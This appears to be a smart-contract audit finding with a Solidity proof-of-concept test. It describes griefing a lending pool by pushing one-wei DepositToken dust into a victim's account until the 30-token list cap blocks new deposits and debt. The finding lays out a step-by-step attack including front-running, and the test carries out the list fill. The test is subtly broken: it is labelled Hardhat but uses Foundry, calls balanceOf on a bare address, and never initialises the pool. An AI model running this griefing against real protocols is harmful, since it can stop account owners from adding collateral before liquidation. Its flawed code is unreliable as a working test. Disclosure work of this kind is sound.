### Title
Per-account token-list boundary allows collateral-dust griefing that blocks deposits and debt issuance - ([File: contracts/Pool.sol])

### Summary
`Pool.addToDepositTokensOfAccount` rejects adding a token once the sum of an account's deposit-token and debt-token lists reaches `MAX_TOKENS_PER_USER`. Because transferable `DepositToken` positions add themselves to the recipient's list, an attacker can fill a victim's list with economically insignificant dust balances. Any subsequent first-time deposit, liquidation receipt, or debt issuance that requires another list entry reverts with `UserReachedMaxTokens`.

### Finding Description
`Pool.MAX_TOKENS_PER_USER` is fixed at 30, and `onlyIfAdditionWillNotReachMaxTokens` reverts when the combined account lists already contain 30 entries.

`DepositToken._mint` calls `pool.addToDepositTokensOfAccount(account_)` when the recipient's balance changes from zero. `DepositToken._transfer` uses the same list-management path for recipients. Consequently, a recipient does not need to initiate a deposit to occupy list entries: another account can transfer one wei of each supported `DepositToken` to the victim.

At the boundary, the list cannot grow. The revert occurs after the token balance update in `_mint` or `_transfer`, so the enclosing transaction is rolled back. This prevents:

- depositing a collateral type the victim does not already hold;
- issuing debt in a debt token absent from the victim's list;
- receiving a new `DepositToken` through transfer or liquidation seizure.

The debt-token side has the same boundary through `Pool.addToDebtTokensOfAccount`, but dust cannot be pushed through `DebtToken` directly because it is non-transferable.

### Impact Explanation
The affected invariant is account liveness rather than accounting integrity. A victim can be temporarily prevented from adding collateral or opening debt needed to restore account health.

A practical attack sequence is:

1. Acquire a minimal balance of supported `DepositToken`s, either by depositing dust or receiving existing deposit tokens.
2. Transfer one wei of each absent `DepositToken` to the victim.
3. Fill the victim's combined deposit-token/debt-token lists to 30 entries.
4. Front-run the victim's deposit, debt issuance, or self-rescue transaction so the transaction requiring a new list entry reverts.
5. Repeat transfers after the victim removes dust entries, keeping the victim at the boundary while the attacker is willing to keep paying gas and dust costs.

The victim can normally remove an unwanted entry by transferring or withdrawing its dust balance, so the freeze is not necessarily permanent. Nevertheless, repeated insertion can create temporary freezing of protocol functionality and may keep an unhealthy account from adding collateral before liquidation.

### Likelihood Explanation
Likelihood depends on the deployed pool having enough active deposit-token offerings to reach the account limit and on the victim's existing list length.

The attack does not require governance, keeper, oracle, bridge, or privileged access. It only uses public deposits and `DepositToken.transfer`. Its cost is bounded by acquiring and transferring minimal amounts of the required deposit tokens plus transaction gas. It is most practical against accounts already close to the 30-entry boundary, or when the deployed pool exposes close to 30 deposit tokens.

### Recommendation
Do not make a recipient's ability to receive a standard `DepositToken` depend on attacker-controllable list capacity, or make unsolicited dust entries cheap and permissionless to remove.

Possible mitigations include:

- Keep per-account lists only for collateral that has active debt relevance, and calculate health from all positive balances instead.
- Allow deposits of already whitelisted collateral even when the list is full by storing positions in a mapping keyed by token rather than relying on an enumerable list.
- Add a permissioned or signed opt-in requirement for creating a new token-list entry.
- Track meaningful balances rather than any nonzero balance.
- Provide a batched cleanup function that can remove multiple zero-value or dust-valued entries atomically before the protected action.

### Proof of Concept
The following Hardhat-style test demonstrates the boundary condition. It assumes `pool.getDepositTokens()` returns at least `MAX_TOKENS_PER_USER - existingEntries` active deposit tokens and that the attacker can acquire one wei of each.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {Pool} from "contracts/Pool.sol";
import {DepositToken} from "contracts/DepositToken.sol";
import {IERC20} from "contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";

contract TokenListBoundaryGriefingTest is Test {
    Pool pool;
    address attacker = address(0xA11CE);
    address victim = address(0xB0B);

    function testDustFillBlocksNewDepositTokenEntry() external {
        uint256 max = pool.MAX_TOKENS_PER_USER();
        address[] memory tokens = pool.getDepositTokensOfAccount(victim);
        uint256 existing = tokens.length + pool.getDebtTokensOfAccount(victim).length;

        require(existing < max, "victim already at cap");

        address[] memory depositTokens = pool.getDepositTokens();
        uint256 needed = max - existing;
        uint256 filled;

        vm.startPrank(attacker);

        for (uint256 i; i < depositTokens.length && filled < needed; ++i) {
            DepositToken dToken = DepositToken(depositTokens[i]);

            if (dToken.balanceOf(victim) != 0) {
                continue;
            }

            IERC20 underlying = dToken.underlying();
            deal(address(underlying), attacker, 1);
            underlying.approve(address(dToken), 1);
            dToken.deposit(1, attacker);
            dToken.transfer(victim, 1);
            ++filled;
        }

        vm.stopPrank();

        assertEq(filled, needed);
        assertEq(
            pool.getDepositTokensOfAccount(victim).length
                + pool.getDebtTokensOfAccount(victim).length,
            max
        );

        address[] memory remaining = pool.getDepositTokens();
        DepositToken newToken;

        for (uint256 i; i < remaining.length; ++i) {
            if (remaining[i].balanceOf(victim) == 0) {
                newToken = DepositToken(remaining[i]);
                break;
            }
        }

        vm.startPrank(victim);
        IERC20 newUnderlying = newToken.underlying();
        newUnderlying.approve(address(newToken), 1);
        deal(address(newUnderlying), victim, 1);

        vm.expectRevert(Pool.UserReachedMaxTokens.selector);
        newToken.deposit(1, victim);
        vm.stopPrank();
    }
}
```

The key assertion is that the victim's combined list length is exactly `MAX_TOKENS_PER_USER`, after which `DepositToken.deposit` for a previously unused supported collateral reverts in `pool.addToDepositTokensOfAccount`.
